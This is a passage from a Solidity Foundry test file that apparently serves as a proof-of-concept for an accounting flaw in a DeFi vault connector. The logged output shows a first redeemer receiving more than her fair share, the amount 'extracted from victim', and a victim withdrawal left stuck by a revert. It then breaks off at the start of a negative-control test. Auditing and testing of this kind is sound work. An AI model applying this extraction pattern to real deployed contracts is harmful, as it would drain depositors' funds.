        accountingManager.withdraw(100e6, bob);
        vm.startPrank(owner);
        accountingManager.calculateWithdrawShares(10);
        accountingManager.startCurrentWithdrawGroup();
        vm.expectRevert("MorphoMock: burn exceeds supply shares");
        connector.withdraw(victimPromised, idA, true);
        vm.stopPrank();

        console.log("first redeemer received      :", aliceGot);
        console.log("her fair share (honest TVL)  :", fairFirst);
        console.log("extracted from victim (wei)  :", aliceGot - fairFirst);
        console.log("victim max realizable        :", victimRealizable);
        console.log("victim promised (stuck)      :", victimPromised);
    }

    // ------------- E3: negative control for the escalated flow -------------

    function test_control_escalatedFlow_pristine_noLossNoBrick() public {
